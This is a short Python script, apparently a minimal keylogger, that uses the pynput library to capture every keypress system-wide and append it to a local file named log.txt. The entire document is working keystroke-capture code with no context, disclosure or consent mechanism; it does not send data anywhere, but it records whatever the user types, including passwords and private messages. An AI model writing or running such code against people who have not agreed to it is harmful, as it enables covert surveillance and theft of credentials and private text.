import pynput
import keyboard
from pynput.keyboard import Listener

def on_press(key):
    with open("log.txt", "a") as file:
        file.write(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
